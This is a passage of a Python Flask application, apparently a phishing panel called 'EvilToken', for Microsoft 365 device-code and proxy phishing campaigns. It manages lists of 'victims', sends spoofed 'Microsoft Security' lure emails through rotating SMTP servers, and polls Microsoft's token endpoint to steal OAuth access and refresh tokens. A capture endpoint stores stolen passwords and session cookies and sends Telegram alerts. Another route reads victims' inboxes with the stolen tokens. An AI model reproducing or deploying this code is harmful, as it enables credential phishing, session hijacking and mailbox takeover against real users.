    return redirect(url_for('campaign_detail', campaign_id=campaign_id))

@app.route('/campaign/<int:campaign_id>/delete', methods=['POST'])
@admin_only
def delete_campaign(campaign_id):
    conn = get_db()
    conn.execute("DELETE FROM victims WHERE campaign_id = ?", (campaign_id,))
    conn.execute("DELETE FROM campaigns WHERE id = ?", (campaign_id,))
    conn.commit()
    conn.close()
    log_activity('campaign_deleted', f"Campaign {campaign_id} deleted")
    flash("🗑️ Campaign deleted successfully.", "success")
    return redirect(url_for('dashboard'))

@app.route('/campaign/<int:campaign_id>/settings', methods=['GET', 'POST'])
@admin_only
def campaign_settings(campaign_id):
    conn = get_db()
    campaign = conn.execute("SELECT * FROM campaigns WHERE id = ?", (campaign_id,)).fetchone()
    if not campaign:
        flash("Campaign not found.", "danger")
        return redirect(url_for('dashboard'))
    
    if request.method == 'POST':
        worker_redirect = 1 if request.form.get('worker_redirect') else 0
        conn.execute(
            "UPDATE campaigns SET worker_redirect = ? WHERE id = ?",
            (worker_redirect, campaign_id)
        )
        conn.commit()
        conn.close()
        flash("Campaign settings updated!", "success")
        return redirect(url_for('campaign_detail', campaign_id=campaign_id))
    
    conn.close()
    return render_template('campaign_settings.html', campaign=campaign, is_admin=True)

# ============================================================
# TEMPLATE ROUTES
# ============================================================
@app.route('/templates')
@admin_only
def list_templates():
    conn = get_db()
    templates = conn.execute("SELECT * FROM templates ORDER BY id DESC").fetchall()
    conn.close()
    return render_template('templates.html', templates=templates, is_admin=True)

# ============================================================
# SMTP ROUTES
# ============================================================
@app.route('/smtp/add', methods=['POST'])
@admin_only
def add_smtp_provider():
    name = request.form.get('name')
    server = request.form.get('server')
    port = request.form.get('port')
    username = request.form.get('username')
    password = request.form.get('password')
    from_email = request.form.get('from_email')
    
    if not all([name, server, port, username, password, from_email]):
        flash("⚠️ All fields are required.", "danger")
        return redirect(url_for('settings'))
    
    conn = get_db()
    conn.execute(
        """INSERT INTO smtp_providers (name, server, port, username, password, from_email, enabled, created_at)
           VALUES (?, ?, ?, ?, ?, ?, 1, ?)""",
        (name, server, int(port), username, password, from_email, datetime.now().isoformat())
    )
    conn.commit()
    conn.close()
    log_activity('smtp_added', f"SMTP provider '{name}' added")
    flash(f"✅ SMTP provider '{name}' added.", "success")
    return redirect(url_for('settings'))

@app.route('/smtp/<int:provider_id>/toggle', methods=['POST'])
@admin_only
def toggle_smtp_provider(provider_id):
    conn = get_db()
    provider = conn.execute("SELECT enabled FROM smtp_providers WHERE id = ?", (provider_id,)).fetchone()
    if provider:
        new_status = 0 if provider['enabled'] else 1
        conn.execute("UPDATE smtp_providers SET enabled = ? WHERE id = ?", (new_status, provider_id))
        conn.commit()
        status_text = "enabled" if new_status else "disabled"
        log_activity('smtp_toggled', f"SMTP provider {provider_id} {status_text}")
        flash(f"✅ SMTP provider {status_text}.", "success")
    conn.close()
    return redirect(url_for('settings'))

@app.route('/smtp/<int:provider_id>/delete', methods=['POST'])
@admin_only
def delete_smtp_provider(provider_id):
    conn = get_db()
    provider = conn.execute("SELECT name FROM smtp_providers WHERE id = ?", (provider_id,)).fetchone()
    if provider:
        conn.execute("DELETE FROM smtp_providers WHERE id = ?", (provider_id,))
        conn.commit()
        log_activity('smtp_deleted', f"SMTP provider '{provider['name']}' deleted")
        flash(f"🗑️ SMTP provider '{provider['name']}' deleted.", "success")
    conn.close()
    return redirect(url_for('settings'))

@app.route('/smtp/test', methods=['POST'])
@admin_only
def test_smtp_provider():
    provider_id = request.form.get('provider_id')
    test_email = request.form.get('test_email')
    
    if not provider_id or not test_email:
        return jsonify({'success': False, 'error': 'Missing provider ID or test email'}), 400
    
    conn = get_db()
    provider = conn.execute("SELECT * FROM smtp_providers WHERE id = ?", (provider_id,)).fetchone()
    conn.close()
    
    if not provider:
        return jsonify({'success': False, 'error': 'Provider not found'}), 404
    
    try:
        msg = MIMEMultipart('alternative')
        msg['From'] = f"Test <{provider['from_email']}>"
        msg['To'] = test_email
        msg['Subject'] = "SMTP Test"
        msg.attach(MIMEText("<p>This is a test email from EvilToken.</p>", 'html'))
        
        server = smtplib.SMTP(provider['server'], provider['port'], timeout=30)
        server.ehlo()
        if provider['port'] in (587, 465):
            server.starttls()
            server.ehlo()
        server.login(provider['username'], provider['password'])
        server.send_message(msg)
        server.quit()
        
        return jsonify({'success': True, 'message': f'Test email sent to {test_email}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================
# API ROUTES
# ============================================================
@app.route('/api/stats')
@admin_only
def stats():
    conn = get_db()
    total = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
    captured = conn.execute("SELECT COUNT(*) FROM victims WHERE access_token IS NOT NULL").fetchone()[0]
    conn.close()
    return jsonify({"total": total, "captured": captured})

@app.route('/api/activities')
@admin_only
def get_activities():
    conn = get_db()
    activities = conn.execute("SELECT * FROM activities ORDER BY id DESC LIMIT 30").fetchall()
    conn.close()
    return jsonify([dict(a) for a in activities])

@app.route('/api/notifications')
@admin_only
def get_notifications():
    conn = get_db()
    activities = conn.execute("SELECT * FROM activities ORDER BY id DESC LIMIT 10").fetchall()
    conn.close()
    return jsonify([dict(a) for a in activities])

@app.route('/api/activity_daily')
@admin_only
def activity_daily():
    conn = get_db()
    rows = conn.execute("""
        SELECT DATE(created_at) as day, COUNT(*) as count
        FROM activities
        WHERE created_at >= DATE('now', '-7 days')
        GROUP BY DATE(created_at)
        ORDER BY day ASC
    """).fetchall()
    conn.close()
    days = []
    counts = []
    for i in range(6, -1, -1):
        d = (datetime.now() - timedelta(days=i)).strftime('%Y-%m-%d')
        days.append(d)
        count = 0
        for row in rows:
            if row['day'] == d:
                count = row['count']
                break
        counts.append(count)
    return jsonify({'labels': days, 'data': counts})

@app.route('/api/campaign_trend')
@admin_only
def campaign_trend():
    conn = get_db()
    rows = conn.execute("""
        SELECT DATE(captured_at) as day, COUNT(*) as count
        FROM victims
        WHERE captured_at IS NOT NULL AND captured_at >= DATE('now', '-7 days')
        GROUP BY DATE(captured_at)
        ORDER BY day ASC
    """).fetchall()
    conn.close()
    days = []
    counts = []
    for i in range(6, -1, -1):
        d = (datetime.now() - timedelta(days=i)).strftime('%Y-%m-%d')
        days.append(d)
        count = 0
        for row in rows:
            if row['day'] == d:
                count = row['count']
                break
        counts.append(count)
    return jsonify({'labels': days, 'data': counts})

@app.route('/api/smtp_stats')
@admin_only
def smtp_stats():
    conn = get_db()
    providers = conn.execute("""
        SELECT name, server, enabled, score, success_count, fail_count
        FROM smtp_providers
        ORDER BY score DESC
    """).fetchall()
    conn.close()
    return jsonify([dict(p) for p in providers])

# ============================================================
# TEST EMAIL
# ============================================================
@app.route('/test_email', methods=['POST'])
@admin_only
def test_email():
    to = request.form.get('test_email')
    subject = request.form.get('subject', 'Test Email')
    body = request.form.get('body', '<p>Test content</p>')
    
    if not to:
        return jsonify({'success': False, 'error': 'Please provide a test email address.'}), 400
    
    smtp = get_next_smtp()
    
    if not smtp or not smtp.get('from'):
        return jsonify({'success': False, 'error': 'SMTP not configured properly.'}), 500
    
    try:
        msg = MIMEMultipart('alternative')
        sender_name = get_setting('sender_name') or 'Microsoft Security'
        msg['From'] = f"{sender_name} <{smtp['from']}>"
        msg['To'] = to
        msg['Subject'] = subject
        msg['Reply-To'] = smtp['from']
        
        part = MIMEText(body, 'html')
        msg.attach(part)
        
        server = smtplib.SMTP(smtp['server'], smtp['port'], timeout=30)
        server.ehlo()
        if smtp['port'] in (587, 465):
            server.starttls()
            server.ehlo()
        server.login(smtp['username'], smtp['password'])
        server.send_message(msg)
        server.quit()
        
        return jsonify({'success': True, 'message': f'Test email sent to {to}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

# ============================================================
# CAPTURE API
# ============================================================
@app.route('/api/capture', methods=['POST'])
def capture_endpoint():
    try:
        app.logger.info("=" * 60)
        app.logger.info("📥 CAPTURE REQUEST RECEIVED")
        
        provided_secret = request.headers.get('X-Capture-Secret')
        if provided_secret != CAPTURE_SECRET:
            return jsonify({'error': 'Unauthorized'}), 401

        data = request.json
        if not data:
            return jsonify({'error': 'No data'}), 400

        email = data.get('email')
        creds = data.get('credentials')
        cookies = data.get('cookies', [])
        
        app.logger.info(f"📧 Email: '{email}'")
        app.logger.info(f"🍪 Cookies: {len(cookies)}")

        if not email:
            return jsonify({'error': 'No email provided'}), 400

        conn = get_db()
        victim = conn.execute("SELECT id FROM victims WHERE email = ? ORDER BY id DESC LIMIT 1", (email,)).fetchone()
        
        if not victim:
            conn.close()
            return jsonify({'error': f'Victim not found: {email}'}), 404

        victim_id = victim['id']
        conn.execute("UPDATE victims SET access_token = ?, captured_at = ? WHERE id = ?",
                    ("worker_captured", datetime.now().isoformat(), victim_id))

        if creds and creds.get('username') and creds.get('password'):
            conn.execute("INSERT INTO captured_creds (victim_id, username, password, captured_at) VALUES (?, ?, ?, ?)",
                        (victim_id, creds['username'], creds['password'], datetime.now().isoformat()))

        cookie_count = 0
        for c in cookies:
            if c.get('name') and c.get('value'):
                conn.execute("""INSERT INTO captured_cookies
                               (victim_id, cookie_name, cookie_value, domain, secure, expires_at, captured_at)
                               VALUES (?, ?, ?, ?, ?, ?, ?)""",
                            (victim_id, c.get('name'), c.get('value'), c.get('domain', ''),
                             1 if c.get('secure') else 0, c.get('expirationDate'), datetime.now().isoformat()))
                cookie_count += 1

        send_telegram(f"🎯 Worker captured!\n📧 {email}\n🍪 Cookies: {cookie_count}")
        conn.commit()
        conn.close()
        return jsonify({'status': 'ok', 'cookies_stored': cookie_count})

    except Exception as e:
        return jsonify({'error': str(e)}), 500



# ============================================================
# CREATE CAMPAIGN PAGE
# ============================================================
@app.route('/create_campaign', methods=['GET', 'POST'])
@admin_only
def create_campaign():
    conn = get_db()
    templates = conn.execute("SELECT * FROM templates").fetchall()
    
    if request.method == 'POST':
        name = request.form['name']
        template_id = request.form.get('template_id')
        emails_input = request.form.get('emails', '')
        csv_file = request.files.get('csv_file')
        victims_data = []
        
        if csv_file and csv_file.filename.endswith('.csv'):
            content = csv_file.stream.read().decode('utf-8', errors='ignore')
            import re
            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            all_emails = re.findall(email_pattern, content)
            seen_emails = set()
            for email in all_emails:
                if email not in seen_emails:
                    seen_emails.add(email)
                    name_data = extract_name_from_email(email)
                    domain = email.split('@')[1] if '@' in email else ''
                    victims_data.append({
                        'email': email,
                        'first_name': name_data['first_name'],
                        'last_name': name_data['last_name'],
                        'company': domain,
                        'custom_link': ''
                    })
        else:
            for line in emails_input.splitlines():
                email = line.strip()
                if email:
                    name_data = extract_name_from_email(email)
                    victims_data.append({
                        'email': email,
                        'first_name': name_data['first_name'],
                        'last_name': name_data['last_name'],
                        'company': '',
                        'custom_link': ''
                    })
        
        if not victims_data:
            flash("No valid email addresses found.", "danger")
            conn.close()
            return render_template('create_campaign.html', templates=templates, is_admin=True)
        
        cursor = conn.cursor()
        cursor.execute("INSERT INTO campaigns (name, created_at, status) VALUES (?, ?, ?)",
                       (name, datetime.now().isoformat(), 'active'))
        campaign_id = cursor.lastrowid
        
        for v in victims_data:
            token = secrets.token_urlsafe(8)
            cursor.execute("""
                INSERT INTO victims (campaign_id, email, first_name, last_name, company, token, captured_at, custom_link)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (campaign_id, v['email'], v.get('first_name', ''), v.get('last_name', ''), v.get('company', ''), token, None, v.get('custom_link', '')))
        
        conn.commit()
        conn.close()
        log_activity('campaign_created', f"Campaign '{name}' created with {len(victims_data)} victims")
        flash(f"Campaign '{name}' created with {len(victims_data)} victims.", "success")
        return redirect(url_for('campaign_detail', campaign_id=campaign_id))
    
    conn.close()
    return render_template('create_campaign.html', templates=templates, is_admin=True)



# ============================================================
# VICTIM ROUTES
# ============================================================

@app.route('/victim/<int:victim_id>/tokens')
@admin_only
def view_tokens(victim_id):
    conn = get_db()
    victim = conn.execute("SELECT * FROM victims WHERE id=?", (victim_id,)).fetchone()
    conn.close()
    if not victim or not victim['access_token']:
        flash("No tokens available for this victim.", "warning")
        return redirect(url_for('campaign_detail', campaign_id=victim['campaign_id']))
    return render_template('view_tokens.html', victim=victim, is_admin=True)

@app.route('/victim/<int:victim_id>/inbox')
@admin_only
def view_inbox(victim_id):
    conn = get_db()
    victim = conn.execute("SELECT id, email, access_token, refresh_token, campaign_id FROM victims WHERE id=?", (victim_id,)).fetchone()
    conn.close()
    if not victim or not victim['access_token']:
        flash("No access token for this victim.", "danger")
        return redirect(url_for('campaign_detail', campaign_id=victim['campaign_id']))
    
    if victim['access_token'] == 'worker_captured':
        flash("⚠️ This victim was captured via Worker proxy. No OAuth token available.", "warning")
        return redirect(url_for('campaign_detail', campaign_id=victim['campaign_id']))
    
    headers = {"Authorization": f"Bearer {victim['access_token']}"}
    try:
        resp = requests.get("https://graph.microsoft.com/v1.0/me/messages?$top=20&$select=subject,from,receivedDateTime,bodyPreview,id",
                            headers=headers, timeout=15)
        if resp.status_code == 200:
            emails = resp.json().get('value', [])
            return render_template('inbox.html', emails=emails, email=victim['email'], is_admin=True)
    except:
        pass
    
    flash("Could not fetch inbox. Token may be expired.", "danger")
    return redirect(url_for('campaign_detail', campaign_id=victim['campaign_id']))

@app.route('/victim/<int:victim_id>/captures')
@admin_only
def victim_captures(victim_id):
    conn = get_db()
    creds = conn.execute(
        "SELECT * FROM captured_creds WHERE victim_id = ? ORDER BY captured_at DESC",
        (victim_id,)
    ).fetchall()
    cookies = conn.execute(
        "SELECT * FROM captured_cookies WHERE victim_id = ? ORDER BY captured_at DESC",
        (victim_id,)
    ).fetchall()
    conn.close()
    return render_template('captures.html', creds=creds, cookies=cookies, victim_id=victim_id, is_admin=True)



# ============================================================
# VICTIM LANDING PAGE (Lure Link)
# ============================================================
@app.route('/c/<token>')
def landing_token(token):
    conn = get_db()
    victim = conn.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
    if not victim:
        return "Invalid link", 404
    
    campaign = conn.execute("SELECT worker_redirect FROM campaigns WHERE id=?", (victim['campaign_id'],)).fetchone()
    
    if campaign and campaign['worker_redirect'] == 1:
        email = victim['email']
        secret = "X9kL2mP5qR8sT3uV6wY1zA4bC7eF0nH"
        signature = hmac.new(secret.encode(), email.encode(), hashlib.sha256).digest()
        payload = email + '|' + base64.b64encode(signature).decode()
        hmac_token = base64.b64encode(payload.encode()).decode()
        domain_index = victim['id'] % len(WORKER_DOMAINS)
        base_worker_url = WORKER_DOMAINS[domain_index]
        worker_url = f"{base_worker_url}/s/2f9a3b?token={hmac_token}&u={email}"
        
        # Log the click
        try:
            log_worker_click(victim['id'], victim['campaign_id'], email, base_worker_url)
        except Exception as e:
            app.logger.error(f"Click logging failed: {e}")
        
        conn.close()
        app.logger.info(f"🔄 Redirecting victim {email} to Worker: {worker_url}")
        return redirect(worker_url)
    
    # Generate device code flow
    # Get OAuth settings from database
    client_id = get_setting("oauth_client_id") or "36763b37-3377-4ace-b0b2-6e2def2e6b18"
    tenant_id = get_setting("oauth_tenant_id") or "organizations"
    scopes = get_setting("oauth_scopes") or "User.Read offline_access"
    device_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/devicecode"
    data = {"client_id": client_id, "scope": scopes}
    try:
        resp = requests.post(device_url, data=data, timeout=15)
        if resp.status_code != 200:
            return "Error generating code", 500
        device_data = resp.json()
    except:
        return "Error generating code", 500
    
    code = device_data['user_code']
    verification_uri = device_data['verification_uri']
    conn.execute("UPDATE victims SET code=? WHERE id=?", (code, victim['id']))
    conn.commit()
    conn.close()
    
    thread = threading.Thread(target=poll_for_token,
                              args=(device_data['device_code'], device_data['interval'], device_data['expires_in'], victim['id']))
    thread.daemon = True
    thread.start()
    return render_template('landing.html', code=code, verification_uri=verification_uri, is_admin=False)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)

# ============================================================
# RECIPIENTS PAGE
# ============================================================
@app.route('/recipients')
@admin_only
def recipients_page():
    conn = get_db()
    victims = conn.execute("""
        SELECT v.*, c.name as campaign_name 
        FROM victims v 
        LEFT JOIN campaigns c ON v.campaign_id = c.id 
        ORDER BY v.id DESC
    """).fetchall()
    conn.close()
    return render_template('recipients.html', victims=victims, is_admin=True)

# ============================================================
# ANALYTICS PAGE
# ============================================================
@app.route('/analytics')
@admin_only
def analytics_page():
    conn = get_db()
    total = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
    captured = conn.execute("SELECT COUNT(*) FROM victims WHERE access_token IS NOT NULL").fetchone()[0]
    campaigns = conn.execute("SELECT COUNT(*) FROM campaigns").fetchone()[0]
    active = conn.execute("SELECT COUNT(*) FROM campaigns WHERE status='active'").fetchone()[0]
    camp_stats = conn.execute("""
        SELECT c.name, COUNT(v.id) as total, SUM(CASE WHEN v.access_token IS NOT NULL THEN 1 ELSE 0 END) as captured
        FROM campaigns c
        LEFT JOIN victims v ON c.id = v.campaign_id
        GROUP BY c.id
    """).fetchall()
    conn.close()
    return render_template('analytics.html', 
                           total=total, captured=captured, campaigns=campaigns, active=active,
                           camp_stats=camp_stats, is_admin=True)

# ============================================================
# REPORTS PAGE
# ============================================================
@app.route('/reports')
@admin_only
def reports_page():
    conn = get_db()
    smtp_stats = conn.execute("""
        SELECT name, server, enabled, score, success_count, fail_count
        FROM smtp_providers
        ORDER BY score DESC
    """).fetchall()
    conn.close()
    return render_template('reports.html', smtp_stats=smtp_stats, is_admin=True)

# ============================================================
# AUDIT PAGE
# ============================================================
@app.route('/audit')
@admin_only
def audit_page():
    conn = get_db()
    activities = conn.execute("SELECT * FROM activities ORDER BY id DESC LIMIT 100").fetchall()
    conn.close()
    return render_template('audit.html', activities=activities, is_admin=True)

# ============================================================
# INTEGRATIONS PAGE
# ============================================================
@app.route('/integrations')
@admin_only
def integrations_page():
    return render_template('integrations.html', is_admin=True)

# ============================================================
# USERS PAGE
# ============================================================
@app.route('/users')
@admin_only
def users_page():
    return render_template('users.html', is_admin=True)

# ============================================================
# IMPORT CSV PAGE
# ============================================================
@app.route('/import_csv', methods=['GET', 'POST'])
@admin_only
def import_csv():
    if request.method == 'POST':
        name = request.form.get('name', 'Imported Campaign')
        csv_file = request.files.get('csv_file')
        if not csv_file or not csv_file.filename.endswith('.csv'):
            flash("Please upload a valid CSV file.", "danger")
            return redirect(url_for('import_csv'))
        
        content = csv_file.stream.read().decode('utf-8', errors='ignore')
        import re
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        all_emails = re.findall(email_pattern, content)
        seen_emails = set()
        victims_data = []
        for email in all_emails:
            if email not in seen_emails:
                seen_emails.add(email)
                name_data = extract_name_from_email(email)
                domain = email.split('@')[1] if '@' in email else ''
                victims_data.append({
                    'email': email,
                    'first_name': name_data['first_name'],
                    'last_name': name_data['last_name'],
                    'company': domain,
                    'custom_link': ''
                })
        
        if not victims_data:
            flash("No valid email addresses found in the CSV file.", "danger")
            return redirect(url_for('import_csv'))
        
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute("INSERT INTO campaigns (name, created_at, status) VALUES (?, ?, ?)",
                       (name, datetime.now().isoformat(), 'active'))
        campaign_id = cursor.lastrowid
        
        for v in victims_data:
            token = secrets.token_urlsafe(8)
            cursor.execute("""
                INSERT INTO victims (campaign_id, email, first_name, last_name, company, token, captured_at, custom_link)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (campaign_id, v['email'], v.get('first_name', ''), v.get('last_name', ''), v.get('company', ''), token, None, v.get('custom_link', '')))
        
        conn.commit()
        conn.close()
        log_activity('campaign_created', f"Imported {len(victims_data)} victims via CSV for campaign '{name}'")
        flash(f"Campaign '{name}' created with {len(victims_data)} victims from CSV.", "success")
        return redirect(url_for('campaign_detail', campaign_id=campaign_id))
    
    return render_template('import_csv.html', is_admin=True)

# ============================================================
# VICTIM DELETE
# ============================================================
@app.route('/victim/<int:victim_id>/delete', methods=['POST'])
@admin_only
def delete_victim(victim_id):
    conn = get_db()
    victim = conn.execute("SELECT campaign_id FROM victims WHERE id=?", (victim_id,)).fetchone()
    campaign_id = victim['campaign_id'] if victim else None
    if campaign_id:
        conn.execute("DELETE FROM victims WHERE id=?", (victim_id,))
        conn.commit()
        conn.close()
        log_activity('victim_deleted', f"Victim {victim_id} deleted")
        flash("🗑️ Recipient deleted.", "success")
        return redirect(url_for('campaign_detail', campaign_id=campaign_id))
    conn.close()
    flash("Victim not found.", "danger")
    return redirect(url_for('dashboard'))

# ============================================================
# TEMPLATE CREATE
# ============================================================
@app.route('/templates/create', methods=['GET', 'POST'])
@admin_only
def create_template():
    if request.method == 'POST':
        name = request.form['name']
        subject = request.form['subject']
        body = request.form['body']
        template_type = request.form.get('type', 'standard')
        conn = get_db()
        conn.execute(
            "INSERT INTO templates (name, subject, body, type, created_at) VALUES (?, ?, ?, ?, ?)",
            (name, subject, body, template_type, datetime.now().isoformat())
        )
        conn.commit()
        conn.close()
        flash("Template created.", "success")
        return redirect(url_for('list_templates'))
    return render_template('create_template.html', is_admin=True)

# ============================================================
# TEMPLATE EDIT
# ============================================================
@app.route('/templates/<int:template_id>/edit', methods=['GET', 'POST'])
@admin_only
def edit_template(template_id):
    conn = get_db()
    template = conn.execute("SELECT * FROM templates WHERE id=?", (template_id,)).fetchone()
    if not template:
        flash("Template not found.", "danger")
        return redirect(url_for('list_templates'))
    
    if request.method == 'POST':
        name = request.form['name']
        subject = request.form['subject']
        body = request.form['body']
        template_type = request.form.get('type', 'standard')
        conn.execute(
            "UPDATE templates SET name=?, subject=?, body=?, type=? WHERE id=?",
            (name, subject, body, template_type, template_id)
        )
        conn.commit()
        conn.close()
        flash("Template updated.", "success")
        return redirect(url_for('list_templates'))
    
    conn.close()
    return render_template('edit_template.html', template=template, is_admin=True)

# ============================================================
# TEMPLATE PREVIEW
# ============================================================
@app.route('/templates/<int:template_id>/preview')
@admin_only
def preview_template(template_id):
    conn = get_db()
    template = conn.execute("SELECT * FROM templates WHERE id=?", (template_id,)).fetchone()
    conn.close()
    if not template:
        flash("Template not found.", "danger")
        return redirect(url_for('list_templates'))
    
    victim_data = {
        'first_name': 'John',
        'last_name': 'Doe',
        'email': 'john.doe@example.com',
        'company': 'Acme Inc.'
    }
    link = 'https://example.com/verify'
    rendered = render_email_template(template['body'], victim_data, link)
    return render_template('preview_template.html', template=template, rendered=rendered, is_admin=True)

# ============================================================
# TEMPLATE DELETE
# ============================================================
@app.route('/templates/<int:template_id>/delete', methods=['POST'])
@admin_only
def delete_template(template_id):
    conn = get_db()
    conn.execute("DELETE FROM templates WHERE id=?", (template_id,))
    conn.commit()
    conn.close()
    flash("Template deleted.", "success")
    return redirect(url_for('list_templates'))

# ============================================================
# SEND PROGRESS
# ============================================================
@app.route('/send_progress/<job_id>')
@admin_only
def get_progress(job_id):
    data = progress_store.get(job_id)
    if not data:
        return jsonify({'error': 'Job not found'}), 404
    return jsonify(data)

# ============================================================
# POLL FOR TOKEN FUNCTION
# ============================================================
def poll_for_token(device_code, interval, expires_in, victim_id):
    """Poll for OAuth token after device code flow"""
    import time
    client_id = get_setting("oauth_client_id") or "36763b37-3377-4ace-b0b2-6e2def2e6b18"
    tenant_id = get_setting("oauth_tenant_id") or "organizations"
    token_url = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
    data = {
        "grant_type": "device_code",
        "client_id": client_id,
        "device_code": device_code,
    }
    
    start_time = time.time()
    while time.time() - start_time < expires_in:
        try:
            resp = requests.post(token_url, data=data, timeout=10)
            if resp.status_code == 200:
                token_data = resp.json()
                conn = get_db()
                conn.execute(
                    "UPDATE victims SET access_token=?, refresh_token=? WHERE id=?",
                    (token_data.get('access_token'), token_data.get('refresh_token'), victim_id)
                )
                conn.commit()
                conn.close()
                send_telegram(f"🎯 Victim {victim_id} captured via OAuth!")
                return
            elif resp.status_code == 400:
                error_data = resp.json()
                if error_data.get('error') == 'authorization_pending':
                    time.sleep(interval)
                    continue
                else:
                    break
            else:
                break
        except:
            time.sleep(interval)
            continue
    
    conn = get_db()
    conn.execute("UPDATE victims SET access_token='expired' WHERE id=?", (victim_id,))
    conn.commit()
    conn.close()


# ============================================================
# PASSWORD LOGIN SYSTEM (Added without breaking host-based auth)
# ============================================================
from flask_login import LoginManager, login_user, logout_user, current_user

# Setup Flask-Login
login_manager = LoginManager()
login_manager.init_app(app)
login_manager.login_view = 'login_page'

# Simple User class
class User:
    def __init__(self, id, username, password_hash, role='admin'):
        self.id = id
        self.username = username
        self.password_hash = password_hash
        self.role = role
        self.is_authenticated = True
        self.is_active = True
        self.is_anonymous = False
    
    def get_id(self):
        return str(self.id)

@login_manager.user_loader
def load_user(user_id):
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()
    conn.close()
    if user:
        return User(user['id'], user['username'], user['password_hash'], user['role'])
    return None

# Create users table if it doesn't exist
def init_users_table():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        role TEXT DEFAULT 'admin',
        created_at TEXT
    )''')
    
    # Check if admin user exists, if not create one
    admin = conn.execute("SELECT * FROM users WHERE username = 'admin'").fetchone()
    if not admin:
        import hashlib
        password_hash = hashlib.sha256('admin123'.encode()).hexdigest()
        conn.execute(
            "INSERT INTO users (username, password_hash, role, created_at) VALUES (?, ?, ?, ?)",
            ('admin', password_hash, 'admin', datetime.now().isoformat())
        )
        conn.commit()
        print("✅ Admin user created: admin / admin123")
    conn.close()

# Initialize users table
init_users_table()

# Login route
@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            flash('Please enter username and password', 'danger')
            return render_template('login.html')
        
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE username = ?", (username,)).fetchone()
        conn.close()
        
        if user:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            
            if user['password_hash'] == password_hash:
                user_obj = User(user['id'], user['username'], user['password_hash'], user['role'])
                login_user(user_obj)
                flash(f'Welcome back, {username}!', 'success')
                next_page = request.args.get('next')
                if next_page:
                    return redirect(next_page)
                return redirect(url_for('dashboard'))
            else:
                flash('Invalid password', 'danger')
        else:
            flash('User not found', 'danger')
    
    return render_template('login.html')

@app.route('/logout')
def logout_page():
    logout_user()
    flash('You have been logged out.', 'info')
    return redirect(url_for('login_page'))

# Inject current_user into templates
@app.context_processor
def inject_user():
    return dict(current_user=current_user)



# ============================================================
# API ROUTES FOR UI FEATURES
# ============================================================

@app.route('/api/domain_status')
@admin_only
def domain_status():
    """Get current domain and subdomains"""
    base_url = get_setting('base_url') or 'https://auth.dltufurniture.com'
    if base_url.startswith('https://'):
        domain_part = base_url[8:]
    elif base_url.startswith('http://'):
        domain_part = base_url[7:]
    else:
        domain_part = base_url
    domain_parts = domain_part.split('.')
    if len(domain_parts) > 1:
        domain = '.'.join(domain_parts[1:])
    else:
        domain = 'dltufurniture.com'
    
    # Get subdomains from database
    conn = get_db()
    subdomains_list = conn.execute("SELECT value FROM settings WHERE key = 'subdomains_list'").fetchone()
    conn.close()
    
    if subdomains_list and subdomains_list['value']:
        subdomains = subdomains_list['value'].split(',')
    else:
        subdomains = get_subdomains_from_db()
    
    return jsonify({
        'base_url': base_url,
        'domain': domain,
        'subdomains': subdomains
    })

@app.route('/api/update_domain', methods=['POST'])
@admin_only
def update_domain():
    data = request.json
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    new_domain = data.get('domain', '').strip()
    new_subdomains = data.get('subdomains', [])
    if not new_domain:
        return jsonify({'error': 'Domain name is required'}), 400
    if not isinstance(new_subdomains, list) or len(new_subdomains) < 2:
        return jsonify({'error': 'At least 2 subdomains required'}), 400
    new_domain = new_domain.replace('https://', '').replace('http://', '')
    new_domain = new_domain.replace('www.', '').strip('/')
    
    global SUBDOMAINS
    SUBDOMAINS = new_subdomains
    
    new_base_url = f"https://{new_subdomains[0]}.{new_domain}"
    conn = get_db()
    
    # SAVE subdomains_list to database
    conn.execute("UPDATE settings SET value = ? WHERE key = 'subdomains_list'", (','.join(new_subdomains),))
    conn.execute("UPDATE settings SET value = ? WHERE key = 'base_url'", (new_base_url,))
    conn.execute("UPDATE settings SET value = ? WHERE key = 'subdomain_index'", ('0',))
    conn.execute("UPDATE settings SET value = ? WHERE key = 'current_subdomain'", (new_subdomains[0],))
    conn.commit()
    conn.close()
    
    log_activity('domain_updated', f"Domain changed to {new_domain} with {len(new_subdomains)} subdomains")
    return jsonify({
        'message': f'Domain updated to {new_domain}',
        'base_url': new_base_url,
        'subdomains': new_subdomains
    })

@app.route('/api/allowed_hosts', methods=['GET'])
@admin_only
def get_allowed_hosts():
    conn = get_db()
    hosts = conn.execute("SELECT id, host, enabled FROM allowed_hosts ORDER BY host ASC").fetchall()
    conn.close()
    return jsonify([dict(h) for h in hosts])

@app.route('/api/allowed_hosts', methods=['POST'])
@admin_only
def add_allowed_host():
    data = request.json
    if not data or 'host' not in data:
        return jsonify({'error': 'Host is required'}), 400
    host = data['host'].strip().lower()
    host = host.replace('https://', '').replace('http://', '').split('/')[0]
    conn = get_db()
    try:
        conn.execute("INSERT INTO allowed_hosts (host, enabled, created_at) VALUES (?, 1, datetime('now'))", (host,))
        conn.commit()
        conn.close()
        return jsonify({'message': f'Host added: {host}', 'host': host}), 201
    except:
        conn.close()
        return jsonify({'error': 'Host already exists'}), 400

@app.route('/api/allowed_hosts/<int:host_id>', methods=['DELETE'])
@admin_only
